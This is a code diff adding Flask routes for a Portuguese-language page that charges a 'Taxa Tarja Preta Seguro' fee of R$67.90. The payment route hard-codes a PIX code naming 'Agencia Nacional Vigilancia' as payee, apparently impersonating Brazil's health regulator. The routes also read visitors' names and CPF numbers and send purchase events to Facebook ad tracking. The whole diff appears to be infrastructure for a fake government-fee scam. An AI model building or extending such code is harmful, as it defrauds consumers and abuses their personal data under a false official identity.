@@ -3202,5 +3202,144 @@ def utm_demo_form():
         app.logger.error(f"[UTM-DEMO] Erro no formulário de demonstração UTM: {str(e)}")
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
+# Rotas para a Taxa Tarja Preta Seguro (TTPS)
+@app.route('/ttps')
+@confirm_genuity()
+def ttps():
+    """
+    Página da Taxa Tarja Preta Seguro (TTPS)
+    Exibe informações sobre a taxa e opções de pagamento
+    """
+    try:
+        app.logger.info("[PROD] Acessando página da Taxa Tarja Preta Seguro")
+        
+        # Recuperar dados da sessão (útil para personalizar a mensagem)
+        customer_name = session.get('nome', '')
+        customer_cpf = session.get('cpf', '')
+        
+        return render_template('ttps.html', 
+                              customer_name=customer_name, 
+                              customer_cpf=customer_cpf)
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao acessar página TTPS: {str(e)}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
+@app.route('/pagar-ttps')
+@confirm_genuity()
+def pagar_ttps():
+    """
+    Página de pagamento da Taxa Tarja Preta Seguro (TTPS)
+    """
+    try:
+        app.logger.info("[PROD] Acessando página de pagamento da Taxa TTPS")
+        
+        # Gerar código PIX aleatório para a página
+        pix_code = "00020101021226580014br.gov.bcb.pix01361234567890123456789012345678901020051505654041.005802BR5925Agencia Nacional Vigilancia6009SAO PAULO61080540900062070503***63048F74"
+        
+        # Gerar QR code para o código PIX
+        import qrcode
+        from io import BytesIO
+        import base64
+        
+        # Criando o QR Code
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(pix_code)
+        qr.make(fit=True)
+        
+        # Convertendo para imagem
+        img = qr.make_image(fill_color="black", back_color="white")
+        
+        # Salvando em um buffer de memória e convertendo para Base64
+        buffer = BytesIO()
+        img.save(buffer, format="PNG")
+        qr_code_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
+        qr_code_url = f"data:image/png;base64,{qr_code_base64}"
+        
+        # Gerar ID aleatório para o protocolo
+        random_id = ''.join(random.choices(string.digits, k=4))
+        
+        # Registrar evento de InitiateCheckout no Facebook CAPI
+        try:
+            from facebook_conversion_api import track_initiate_checkout
+            
+            # Valor da TTPS
+            ttps_value = 67.90
+            
+            # Enviar evento
+            track_initiate_checkout(value=ttps_value)
+            app.logger.info(f"[FACEBOOK] Evento InitiateCheckout enviado para TTPS com valor {ttps_value}")
+        except Exception as fb_error:
+            app.logger.error(f"[FACEBOOK] Erro ao enviar evento InitiateCheckout para TTPS: {str(fb_error)}")
+        
+        return render_template('pagar_ttps.html', 
+                              pix_code=pix_code,
+                              qr_code_url=qr_code_url,
+                              random_id=random_id)
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao acessar página de pagamento TTPS: {str(e)}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
+@app.route('/ttps_sucesso')
+@confirm_genuity()
+def ttps_sucesso():
+    """
+    Página de sucesso após o pagamento da Taxa Tarja Preta Seguro (TTPS)
+    """
+    try:
+        app.logger.info("[PROD] Acessando página de confirmação do pagamento TTPS")
+        
+        # Recuperar dados da sessão
+        customer_name = session.get('nome', '')
+        customer_cpf = session.get('cpf', '')
+        
+        # Registrar evento de Purchase no Facebook CAPI
+        try:
+            from facebook_conversion_api import track_purchase, prepare_user_data
+            
+            # Valor da TTPS
+            ttps_value = 67.90
+            
+            # Preparar dados do usuário para o evento (com hash)
+            user_data = {}
+            if 'nome' in session and session['nome']:
+                nome_completo = session['nome'].split()
+                if len(nome_completo) >= 1:
+                    # Extrair primeiro e último nome para o evento
+                    first_name = nome_completo[0]
+                    last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
+                    user_data = prepare_user_data(
+                        first_name=first_name,
+                        last_name=last_name,
+                        email=session.get('email'),
+                        phone=session.get('phone'),
+                        external_id=session.get('cpf')
+                    )
+            
+            # Gerar ID de transação
+            transaction_id = f"TTPS-{random.randint(10000000, 99999999)}"
+            
+            # Enviar evento
+            track_purchase(
+                value=float(ttps_value),
+                transaction_id=transaction_id,
+                content_name="Taxa Tarja Preta Seguro (TTPS)"
+            )
+            app.logger.info(f"[FACEBOOK] Evento Purchase enviado para TTPS com valor {ttps_value}")
+        except Exception as fb_error:
+            app.logger.error(f"[FACEBOOK] Erro ao enviar evento Purchase para TTPS: {str(fb_error)}")
+        
+        return render_template('ttps_sucesso.html', 
+                              customer_name=customer_name,
+                              customer_cpf=customer_cpf)
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao acessar página de sucesso TTPS: {str(e)}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
